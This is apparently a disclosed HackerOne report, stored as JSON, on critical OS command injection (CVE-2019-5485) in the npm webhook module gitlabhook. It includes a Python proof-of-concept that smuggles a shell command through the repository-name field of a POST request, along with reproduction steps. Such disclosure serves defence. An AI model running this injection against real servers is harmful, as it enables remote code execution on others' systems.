@@ -1,0 +1,137 @@
+{
+  "id": 685447,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODU0NDc=",
+  "url": "https://hackerone.com/reports/685447",
+  "title": "gitlabhook OS Command Injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-08-31T09:18:46.360Z",
+  "submitted_at": "2019-08-31T09:18:46.360Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "samlyhin",
+    "url": "/samlyhin",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5485"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-09-13T10:37:00.269Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-09-13T10:36:51.792Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report OS Command Injection in gitlabhook.\nIt allows execution of arbitrary code on the remote server, that waits for instructions from gitlab.\n\n# Module\n\n**module name:** gitlabhook \n**version:** 0.0.17\n**npm page:** `https://www.npmjs.com/package/gitlabhook`\n\n## Module Description\n\nThis is an easy to use nodeJS based web hook for GitLab.\n\n## Module Stats\n\n[5] downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nFunction \"ExecFile\" at line 146 executes commands without any sanitization. User input gets passed directly to this command. \n\n## Steps To Reproduce:\n\nAn exploit on python3 was created. \n\n```\n#!/usr/bin/python\n\nimport requests\n\ntarget = \"http://192.168.126.128:3420\"\ncmd = r\"touch /tmp/poc.txt\"\njson = '{\"repository\":{\"name\": \"Diasporrra\\'; %s;\\'\"}}'% cmd\nr = requests.post(target, json)\n\nprint \"Done.\"\n```\n\nPlease follow these steps:\n1.   Create a temporary directory on the filesystem. mkdir /tmp/temp cd /tmp/temp\n2.   Install the module: npm install gitlabhook\n3.    Change directory: cd node_modules/gitlabhook/\n4.    Run the application: node gitlabhook-server.js\n\nAt step 4, you should see that the server is up and running. It should send a big message to the terminal, and this message should finish with the line:\n\n```\nlistening for github events on 0.0.0.0:3420\n```\n\nThis server was set up on Kali Linux machine. This machine has an interface with IP address 192.168.126.128.\n\nI have another machine on Windows, that can reach this Kali Linux machine by the above IP. This Windows machine has python3 installed, and python requests module installed too.\n\nSo, edit the exploit and run it.\n\n```\n#!/usr/bin/python\n\nimport requests\n\ntarget = \"http://192.168.126.128:3420\" #put target IP and port here\ncmd = r\"touch /tmp/poc.txt\" #a command to execute\njson = '{\"repository\":{\"name\": \"Diasporrra\\'; %s;\\'\"}}'% cmd\nr = requests.post(target, json)\n\nprint (\"Done.\")\n```\n\nThe exploit above should create a file /tmp/poc.txt on the victim server.\n\nSo, on the Kali machine, run the next command:\n\n```\nls /tmp/poc.txt\n```\n\nAnd ensure that the file was created.\n\nAlso it's possible to check this vulnerability without usage of additional windows machine. The above exploit may be run on Kali Linux machine:\n\nexploit.py:\n\n```\n#!/bin/python3\n\nimport requests\n\ntarget = \"http://127.0.0.1:3420\" #put target IP and port here\ncmd = r\"touch /tmp/poc.txt\" #a command to execute\njson = '{\"repository\":{\"name\": \"Diasporrra\\'; %s;\\'\"}}'% cmd\nr = requests.post(target, json)\n\nprint (\"Done.\")\n```\nrun it:\n\n```\nchmod 755 exploit.py\npip3 install requests\npython3 exploit.py\n```\n\nand check the result with the following command:\n```\nls /tmp/poc.txt \n```\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAn attacker can achieve Remote Code Execution (RCE) without any conditions.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-10-13T10:36:51.866Z",
+  "allow_singular_disclosure_after": -207377114.73035318,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "dpaysm",
+    "0-1",
+    "cyberunit",
+    "4xrhd",
+    "cyb3rs41n7",
+    "rahuljpeg",
+    "b1076218eab6c041493a56e",
+    "sun_sc",
+    "1mega",
+    "tesla_the_god"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 36908,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "gitlabhook",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
